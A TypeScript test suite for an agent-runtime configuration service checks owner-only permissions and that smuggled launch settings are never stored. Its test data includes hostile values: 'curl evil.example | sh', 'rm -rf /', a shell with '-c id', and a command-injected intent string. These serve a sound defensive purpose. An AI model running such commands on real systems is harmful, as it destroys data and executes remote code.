import { env } from "cloudflare:workers";
import { runInDurableObject } from "cloudflare:test";
import { describe, expect, it } from "vitest";

import type { Actor, Workspace } from "../src/cloudflare/workspace";

/**
 * The runtime configuration surface (R05).
 *
 * Two things are being proved here, and the second is the one that matters.
 *
 * The first is that the screen's writes behave: a runtime can be chosen, a
 * start policy decides whether a mention wakes a machine, a delegation can be
 * re-affirmed, and a stop reaches every live session at once. Each of those has
 * a paired deny case with a valid, authenticated identity that simply is not
 * the owner, so it cannot pass merely because the request was malformed.
 *
 * The second is that none of it became a remote launch-configuration editor.
 * Every write is offered a full set of forbidden fields — executable, script,
 * arguments, working directory, environment, limits — and the durable state is
 * read back afterwards to prove nothing landed. One scenario reads the cloud
 * schema itself and asserts there is no column any of those could live in.
 */

const NOW = 1_800_000_000_000;
const DAY = 86_400_000;
let ordinal = 0;

async function seed(label: string) {
  ordinal += 1;
  const slug = `${label}-${ordinal}`;
  const stub = env.WORKSPACE.getByName(slug);
  await stub.initializeWorkspace({ storageMode: "cloud", hostEpoch: 0, routingEpoch: 1, workspaceSlug: slug, now: NOW });
  const owner: Actor = { memberId: "member-owner", authorizationEpoch: 1 };
  const other: Actor = { memberId: "member-other", authorizationEpoch: 1 };
  for (const [actor, handle] of [[owner, "maya"], [other, "daniel"]] as const) {
    await stub.applyMembership({
      operationId: `${slug}:${actor.memberId}:1`,
      memberId: actor.memberId,
      accountId: `${slug}:${actor.memberId}`,
      handle,
      displayName: handle,
      role: "owner",
      status: "active",
      authorizationEpoch: 1,
      version: 1,
      now: NOW,
    });
  }
  const room = await stub.createChannel({
    actor: owner, idempotencyKey: `${slug}:room`, kind: "public", slug: "general",
    memberIds: [other.memberId], now: NOW,
  });
  const agent = await stub.createAgent({ actor: owner, idempotencyKey: `${slug}:agent`, handle: "triage", now: NOW });
  const foreign = await stub.createAgent({ actor: other, idempotencyKey: `${slug}:foreign`, handle: "theirs", now: NOW });
  return { stub, slug, owner, other, room: room.channelId, agent: agent.agentId, foreign: foreign.agentId };
}

type Seeded = Awaited<ReturnType<typeof seed>>;

async function mention(seeded: Seeded, actor: Actor, body: string, at: number) {
  return seeded.stub.sendMessage({
    actor, idempotencyKey: `${seeded.slug}:msg:${at}`, channelId: seeded.room, bodyMarkdown: body, now: at,
  });
}

async function registerRunner(seeded: Seeded, presetRevision: number, runnerEpoch = 1) {
  return seeded.stub.registerRunner({
    actor: seeded.owner, deviceId: "device-maya-mbp", runnerEpoch, presetRevision,
    agents: [{ agentId: seeded.agent, presetId: "api-worktree" }], now: NOW,
  });
}

async function wakeCount(stub: DurableObjectStub<Workspace>): Promise<number> {
  return runInDurableObject<Workspace, number>(stub, (_instance, state) =>
    state.storage.sql.exec<{ count: number }>("SELECT COUNT(*) AS count FROM runner_wakes").one().count,
  );
}

/**
 * Every shape a caller could use to smuggle launch configuration through a
 * write on this page. Each one is a valid, authenticated request from the real
 * owner — the only thing wrong with it is what it is trying to say.
 */
const FORBIDDEN_LAUNCH_FIELDS: Readonly<Record<string, unknown>> = {
  program: "/bin/sh",
  executable: "C:/Windows/System32/cmd.exe",
  script: "curl evil.example | sh",
  command: "rm -rf /",
  args: ["-c", "id"],
  arguments: ["-c", "id"],
  workingDirectory: "/home/maya/dev/api",
  cwd: "/home/maya",
  directoryAllowlist: ["/"],
  environment: { AWS_SECRET_ACCESS_KEY: "canary-not-a-real-secret" },
  env: { PATH: "/tmp" },
  credentials: { GITHUB_TOKEN: "GITHUB_TOKEN" },
  permissionMode: "acceptEdits",
  maxConcurrent: 99,
  cooldownSeconds: 0,
  timeoutSeconds: 86_400,
  presetRevision: 999,
  presetId: "attacker-preset",
  deviceId: "some-other-machine",
};

describe("R05 choosing a runtime", () => {
  it("RUNTIME-INT-001 lets an owner choose connected or local, and refuses anybody else", async () => {
    const seeded = await seed("runtime-select");

    const view = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW });
    // Nobody has chosen yet, and the screen has to be able to say so.
    expect(view).toMatchObject({ kind: "connected", chosen: false, providerStatus: null });

    await seeded.stub.selectAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, kind: "local", now: NOW + 1 });
    const local = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 2 });
    expect(local).toMatchObject({ kind: "local", chosen: true, providerStatus: "active" });

    await runInDurableObject<Workspace, void>(seeded.stub, async (instance) => {
      // A real member of this workspace, correctly authenticated, who simply
      // does not own the agent. Reported as missing rather than forbidden.
      await expect(
        instance.selectAgentRuntime({ actor: seeded.other, agentId: seeded.agent, kind: "connected", now: NOW + 3 }),
      ).rejects.toThrow("agent not found");
      expect(() =>
        instance.describeAgentRuntime({ actor: seeded.other, agentId: seeded.agent, now: NOW + 3 }),
      ).toThrow("agent not found");
      // And a runtime that needs a provider is not selectable as a bare choice.
      await expect(
        instance.selectAgentRuntime({
          actor: seeded.owner, agentId: seeded.agent, kind: "claude_cloud" as never, now: NOW + 4,
        }),
      ).rejects.toThrow("unknown runtime");
    });

    // The refusals changed nothing.
    const after = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 5 });
    expect(after.kind).toBe("local");
  });

  it("RUNTIME-INT-002 stops the machine when an agent's runtime moves away from local", async () => {
    const seeded = await seed("runtime-move");
    await seeded.stub.selectAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, kind: "local", now: NOW });
    await registerRunner(seeded, 3);
    await mention(seeded, seeded.owner, "@a.triage look at this", NOW + 10);
    expect(await wakeCount(seeded.stub)).toBe(1);

    await seeded.stub.selectAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, kind: "connected", now: NOW + 20 });
    // The wake that was still owed to that machine goes with the change: it
    // would otherwise start a harness for work no longer routed there.
    expect(await wakeCount(seeded.stub)).toBe(0);

    // And a later mention adds none, because a connected agent has no machine
    // to wake. The work is still queued; an owner's MCP client reads it.
    await mention(seeded, seeded.owner, "@a.triage and this", NOW + 30);
    expect(await wakeCount(seeded.stub)).toBe(0);
    const view = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 31 });
    expect(view.local.waiting).toBe(2);
  });
});

describe("R05 who may start a session", () => {
  it("RUNTIME-INT-003 queues the work but refuses the wake when the policy says so", async () => {
    const seeded = await seed("runtime-policy");
    await seeded.stub.selectAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, kind: "local", now: NOW });
    await registerRunner(seeded, 1);
    await seeded.stub.setLocalRuntimePolicy({
      actor: seeded.owner, agentId: seeded.agent, startOnMention: true, whoMayStart: "owners", now: NOW + 1,
    });

    // Somebody who is in the room but does not own the agent.
    await mention(seeded, seeded.other, "@a.triage please look", NOW + 10);
    expect(await wakeCount(seeded.stub)).toBe(0);
    // The work is still there. Refusing to *start* is not refusing to *hear*.
    const refused = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 11 });
    expect(refused.local.waiting).toBe(1);

    // The owner's own mention starts it.
    await mention(seeded, seeded.owner, "@a.triage now please", NOW + 20);
    expect(await wakeCount(seeded.stub)).toBe(1);

    // Off entirely: even an owner's mention queues without waking anything.
    await seeded.stub.setLocalRuntimePolicy({
      actor: seeded.owner, agentId: seeded.agent, startOnMention: false, whoMayStart: "scope", now: NOW + 30,
    });
    await runInDurableObject<Workspace, void>(seeded.stub, (_instance, state) => {
      state.storage.sql.exec("DELETE FROM runner_wakes");
    });
    await mention(seeded, seeded.owner, "@a.triage still nothing", NOW + 40);
    expect(await wakeCount(seeded.stub)).toBe(0);
    const queued = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 41 });
    expect(queued.local.waiting).toBe(3);

    // And an owner can still start it by hand, which is what "off" leaves open.
    await seeded.stub.startLocalRuntimeNow({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 50 });
    expect(await wakeCount(seeded.stub)).toBe(1);
  });

  it("RUNTIME-INT-004 refuses the policy and the manual start to a non-owner", async () => {
    const seeded = await seed("runtime-policy-deny");
    await seeded.stub.selectAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, kind: "local", now: NOW });
    await registerRunner(seeded, 1);

    await runInDurableObject<Workspace, void>(seeded.stub, async (instance) => {
      await expect(
        instance.setLocalRuntimePolicy({
          actor: seeded.other, agentId: seeded.agent, startOnMention: false, whoMayStart: "owners", now: NOW + 1,
        }),
      ).rejects.toThrow("agent not found");
      await expect(
        instance.startLocalRuntimeNow({ actor: seeded.other, agentId: seeded.agent, now: NOW + 2 }),
      ).rejects.toThrow("agent not found");
      // An unknown policy value is refused rather than coerced to the open one.
      await expect(
        instance.setLocalRuntimePolicy({
          actor: seeded.owner, agentId: seeded.agent, startOnMention: true,
          whoMayStart: "everyone" as never, now: NOW + 3,
        }),
      ).rejects.toThrow("unknown start policy");
    });

    // Nothing was written by any of that, and no wake was staged.
    expect(await wakeCount(seeded.stub)).toBe(0);
    const rows = await runInDurableObject<Workspace, number>(seeded.stub, (_instance, state) =>
      state.storage.sql.exec<{ count: number }>("SELECT COUNT(*) AS count FROM agent_local_policies").one().count,
    );
    expect(rows).toBe(0);
  });
});

describe("R05 local preset changes stay pending until the machine confirms", () => {
  it("RUNTIME-INT-005 clears an ask only when that machine's own revision moves", async () => {
    const seeded = await seed("runtime-preset");
    await seeded.stub.selectAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, kind: "local", now: NOW });
    await registerRunner(seeded, 14);

    const asked = await seeded.stub.requestLocalPresetChange({
      actor: seeded.owner, agentId: seeded.agent, intent: "approve_agent", now: NOW + 1,
    });
    expect(asked).toMatchObject({ state: "pending", deviceId: "device-maya-mbp" });

    // Asking twice is one ask, not two identical pending rows.
    const again = await seeded.stub.requestLocalPresetChange({
      actor: seeded.owner, agentId: seeded.agent, intent: "approve_agent", now: NOW + 2,
    });
    expect(again.requestId).toBe(asked.requestId);

    // The machine reconnecting at the *same* revision confirms nothing. This is
    // the case the whole pending state exists for: a registration is not
    // evidence that anybody stood at that computer.
    await registerRunner(seeded, 14, 2);
    let view = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 3 });
    expect(view.local.presetRequests).toEqual([
      expect.objectContaining({ intent: "approve_agent", state: "pending", revisionAtRequest: 14 }),
    ]);

    // The daemon is told what it owes a person, where it already asks for work.
    const depth = await seeded.stub.runnerQueueDepth({ actor: seeded.owner, deviceId: "device-maya-mbp", now: NOW + 4 });
    expect(depth.agents[0].localReviews).toEqual(["approve_agent"]);

    // A revision that has moved on is the machine saying somebody did the work.
    const registered = await registerRunner(seeded, 15, 3);
    expect(registered.confirmedLocalReviews).toBe(1);
    view = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 5 });
    expect(view.local.presetRequests).toEqual([
      expect.objectContaining({ state: "confirmed", resolvedRevision: 15 }),
    ]);
    const cleared = await seeded.stub.runnerQueueDepth({ actor: seeded.owner, deviceId: "device-maya-mbp", now: NOW + 6 });
    expect(cleared.agents[0].localReviews).toEqual([]);
  });

  it("RUNTIME-INT-006 refuses every launch field and every non-owner on the ask path", async () => {
    const seeded = await seed("runtime-preset-deny");
    await seeded.stub.selectAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, kind: "local", now: NOW });
    await registerRunner(seeded, 5);

    await runInDurableObject<Workspace, void>(seeded.stub, async (instance) => {
      // Not an owner.
      await expect(
        instance.requestLocalPresetChange({
          actor: seeded.other, agentId: seeded.agent, intent: "review_preset", now: NOW + 1,
        }),
      ).rejects.toThrow("agent not found");

      // An intent that is really a command.
      for (const intent of ["review_preset; rm -rf /", "run", "", "approve_agent "]) {
        await expect(
          instance.requestLocalPresetChange({
            actor: seeded.owner, agentId: seeded.agent, intent: intent as never, now: NOW + 2,
          }),
        ).rejects.toThrow("unknown local preset intent");
      }

      // A valid intent carrying every forbidden field alongside it. The extra
      // keys are ignored rather than stored, which the row check below proves.
      await instance.requestLocalPresetChange({
        actor: seeded.owner, agentId: seeded.agent, intent: "review_limits",
        now: NOW + 3, ...FORBIDDEN_LAUNCH_FIELDS,
      } as never);
    });

    const stored = await runInDurableObject<Workspace, Record<string, SqlStorageValue>[]>(
      seeded.stub,
      (_instance, state) =>
        state.storage.sql.exec<Record<string, SqlStorageValue>>("SELECT * FROM runner_preset_requests").toArray(),
    );
    expect(stored).toHaveLength(1);
    // The row it wrote is the ask and nothing else: the revision it recorded is
    // the machine's real one, not the 999 the caller asked for, and the device
    // is the machine that actually answers rather than the one named.
    expect(stored[0]).toMatchObject({
      intent: "review_limits", state: "pending", revision_at_request: 5, device_id: "device-maya-mbp",
    });
    const serialized = JSON.stringify(stored);
    for (const canary of ["/bin/sh", "rm -rf", "acceptEdits", "canary-not-a-real-secret", "attacker-preset", "some-other-machine"]) {
      expect(serialized).not.toContain(canary);
    }
  });

  it("RUNTIME-INT-007 refuses an ask when no machine answers, and lets an owner withdraw one", async () => {
    const seeded = await seed("runtime-preset-withdraw");
    await seeded.stub.selectAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, kind: "local", now: NOW });

    await runInDurableObject<Workspace, void>(seeded.stub, async (instance) => {
      await expect(
        instance.requestLocalPresetChange({
          actor: seeded.owner, agentId: seeded.agent, intent: "review_preset", now: NOW + 1,
        }),
      ).rejects.toThrow("no machine answers for this agent");
    });

    await registerRunner(seeded, 2);
    const asked = await seeded.stub.requestLocalPresetChange({
      actor: seeded.owner, agentId: seeded.agent, intent: "review_preset", now: NOW + 2,
    });

    await runInDurableObject<Workspace, void>(seeded.stub, async (instance) => {
      await expect(
        instance.withdrawLocalPresetChange({ actor: seeded.other, requestId: asked.requestId, now: NOW + 3 }),
      ).rejects.toThrow("agent not found");
    });

    await expect(
      seeded.stub.withdrawLocalPresetChange({ actor: seeded.owner, requestId: asked.requestId, now: NOW + 4 }),
    ).resolves.toEqual({ withdrawn: true });
    // Withdrawing twice is not an error and does not resurrect the ask.
    await expect(
      seeded.stub.withdrawLocalPresetChange({ actor: seeded.owner, requestId: asked.requestId, now: NOW + 5 }),
    ).resolves.toEqual({ withdrawn: false });
    const depth = await seeded.stub.runnerQueueDepth({ actor: seeded.owner, deviceId: "device-maya-mbp", now: NOW + 6 });
    expect(depth.agents[0].localReviews).toEqual([]);
  });

  it("RUNTIME-INT-008 keeps every launch field out of the cloud schema entirely", async () => {
    const seeded = await seed("runtime-schema");
    const ddl = await runInDurableObject<Workspace, string>(seeded.stub, (_instance, state) =>
      state.storage.sql
        .exec<{ sql: string | null }>("SELECT sql FROM sqlite_master WHERE sql IS NOT NULL")
        .toArray()
        .map((row) => row.sql ?? "")
        .join("\n"),
    );
    // Not a spot check: the declared text of every table, index and trigger in
    // the workspace schema. A column any of these names could live in is a
    // column somebody would eventually fill.
    for (const forbidden of [
      "program", "executable", "script", "command", "argv", "args", "arguments",
      "working_directory", "cwd", "directory_allowlist", "environment", "permission_mode",
      "max_concurrent", "cooldown_seconds", "timeout_seconds", "passphrase",
    ]) {
      expect(new RegExp(`(^|[\\s(,])${forbidden}\\s+(TEXT|INTEGER|REAL|BLOB|ANY)`, "im").test(ddl)).toBe(false);
    }
  });
});

describe("R05 start, stop, expiry and budget", () => {
  it("RUNTIME-INT-009 stops every live session at once and refuses a non-owner", async () => {
    const seeded = await seed("runtime-stop");
    await seeded.stub.selectAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, kind: "local", now: NOW });
    await registerRunner(seeded, 1);
    await seeded.stub.createAgentDelegation({
      actor: seeded.owner, agent: seeded.agent, channelIds: [seeded.room], expiresAt: NOW + 10 * DAY, now: NOW + 1,
    });
    const session = await seeded.stub.startRunnerSession({
      actor: seeded.owner, deviceId: "device-maya-mbp", agentId: seeded.agent, now: NOW + 2,
    });
    await mention(seeded, seeded.owner, "@a.triage go", NOW + 3);

    let view = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 4 });
    expect(view.sessions[0]).toMatchObject({ sessionId: session.sessionId, live: true });

    await runInDurableObject<Workspace, void>(seeded.stub, async (instance) => {
      await expect(
        instance.stopAgentRuntime({ actor: seeded.other, agentId: seeded.agent, now: NOW + 5 }),
      ).rejects.toThrow("agent not found");
    });
    // Refused, and still live: a denied stop must not half-stop anything.
    view = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 6 });
    expect(view.sessions[0].live).toBe(true);

    await expect(
      seeded.stub.stopAgentRuntime({
        actor: seeded.owner, agentId: seeded.agent, reason: "stopped_from_runtime_page", now: NOW + 7,
      }),
    ).resolves.toEqual({ sessionsStopped: 1 });
    view = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 8 });
    expect(view.sessions[0]).toMatchObject({ live: false, endedReason: "stopped_from_runtime_page" });
    // An uncollected wake must not outlive the stop that overtook it.
    expect(await wakeCount(seeded.stub)).toBe(0);
  });

  it("RUNTIME-INT-010 re-affirms an expiry forward only, and only for its own owner", async () => {
    const seeded = await seed("runtime-expiry");
    const delegation = await seeded.stub.createAgentDelegation({
      actor: seeded.owner, agent: seeded.agent, channelIds: [seeded.room],
      credentialIds: [], expiresAt: NOW + 2 * DAY, now: NOW,
    });

    const view = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 1 });
    // The sentence is built once, in the domain, and the page reads this one.
    expect(view.delegation?.sentence).toBe(
      `Runs as @maya in #general until ${new Date(NOW + 2 * DAY).getUTCDate()} ${
        ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"][
          new Date(NOW + 2 * DAY).getUTCMonth()
        ]
      } ${new Date(NOW + 2 * DAY).getUTCFullYear()}. May use no credential.`,
    );

    await runInDurableObject<Workspace, void>(seeded.stub, async (instance) => {
      await expect(
        instance.reaffirmAgentDelegation({
          actor: seeded.other, delegationId: delegation.id, expiresAt: NOW + 20 * DAY, now: NOW + 2,
        }),
      ).rejects.toThrow();
      // Backwards is refused: "re-affirm" is not a way to quietly shorten or
      // resurrect a window somebody else is relying on.
      await expect(
        instance.reaffirmAgentDelegation({
          actor: seeded.owner, delegationId: delegation.id, expiresAt: NOW + DAY, now: NOW + 3,
        }),
      ).rejects.toThrow("not later than the current expiry");
    });

    await expect(
      seeded.stub.reaffirmAgentDelegation({
        actor: seeded.owner, delegationId: delegation.id, expiresAt: NOW + 30 * DAY, now: NOW + 4,
      }),
    ).resolves.toEqual({ expiresAt: NOW + 30 * DAY });

    // A revoked delegation cannot be brought back by re-affirming it.
    await seeded.stub.revokeAgentDelegation({ actor: seeded.owner, delegationId: delegation.id, now: NOW + 5 });
    await runInDurableObject<Workspace, void>(seeded.stub, async (instance) => {
      await expect(
        instance.reaffirmAgentDelegation({
          actor: seeded.owner, delegationId: delegation.id, expiresAt: NOW + 60 * DAY, now: NOW + 6,
        }),
      ).rejects.toThrow("delegation is not active");
    });
    const after = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 7 });
    expect(after.delegation).toBeNull();
  });

  it("RUNTIME-INT-011 shows failed and attention states rather than hiding them", async () => {
    const seeded = await seed("runtime-history");
    await runInDurableObject<Workspace, void>(seeded.stub, (_instance, state) => {
      // A scheduled run that never created a session, which is exactly the row
      // a silently-dead nightly job has to leave behind.
      state.storage.sql.exec(
        `INSERT INTO runtime_runs(id, agent_id, kind, state, failure_code, budget_cents, created_at, updated_at)
         VALUES ('run-failed', ?, 'scheduled', 'failed', 'environment_archived', 500, ?, ?)`,
        seeded.agent, NOW, NOW,
      );
      state.storage.sql.exec(
        `INSERT INTO runtime_runs(id, agent_id, kind, provider_session_id, state, failure_code, budget_cents, created_at, updated_at)
         VALUES ('run-budget', ?, 'mention', 'sesn_1', 'idle', 'budget_exceeded', 500, ?, ?)`,
        seeded.agent, NOW + 1, NOW + 1,
      );
    });

    const view = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 2 });
    expect(view.runs).toEqual([
      expect.objectContaining({ id: "run-budget", state: "idle", failureCode: "budget_exceeded", hasProviderSession: true }),
      expect.objectContaining({ id: "run-failed", state: "failed", failureCode: "environment_archived", hasProviderSession: false }),
    ]);

    await runInDurableObject<Workspace, void>(seeded.stub, async (instance) => {
      // A session budget cannot be raised to at or below what has been spent,
      // and a run with no provider session has no budget to change at all.
      await expect(
        instance.updateClaudeSessionBudget({
          actor: seeded.owner, runId: "run-failed", nextBudgetCents: 1000, consumedCents: 0, now: NOW + 3,
        }),
      ).rejects.toThrow("cloud session run does not exist");
      await expect(
        instance.updateClaudeSessionBudget({
          actor: seeded.other, runId: "run-budget", nextBudgetCents: 1000, consumedCents: 0, now: NOW + 4,
        }),
      ).rejects.toThrow("agent not found");
    });
  });

  it("RUNTIME-INT-012 surfaces the items a stopped run left needing a person", async () => {
    const seeded = await seed("runtime-attention");
    await seeded.stub.selectAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, kind: "local", now: NOW });
    await registerRunner(seeded, 1);
    await seeded.stub.createAgentDelegation({
      actor: seeded.owner, agent: seeded.agent, channelIds: [seeded.room], expiresAt: NOW + 10 * DAY, now: NOW + 1,
    });
    const session = await seeded.stub.startRunnerSession({
      actor: seeded.owner, deviceId: "device-maya-mbp", agentId: seeded.agent, now: NOW + 2,
    });
    await mention(seeded, seeded.owner, "@a.triage please deploy", NOW + 3);
    const claimed = await seeded.stub.claimAgentWork({
      actor: seeded.owner,
      sessionToken: session.token,
      agent: seeded.agent,
      claimId: "claim-runtime-attention",
      leaseToken: `lease-runtime-${"x".repeat(40)}`,
      sessionId: session.sessionId,
      now: NOW + 4,
    });
    expect(claimed.item).not.toBeNull();

    await seeded.stub.reportRunnerOutcome({
      actor: seeded.owner, deviceId: "device-maya-mbp", agentId: seeded.agent, sessionId: session.sessionId,
      outcome: "blocked", reason: "the harness refused a file edit", now: NOW + 5,
    });

    const view = await seeded.stub.describeAgentRuntime({ actor: seeded.owner, agentId: seeded.agent, now: NOW + 6 });
    expect(view.local.needsAttention).toBe(1);
  });
});
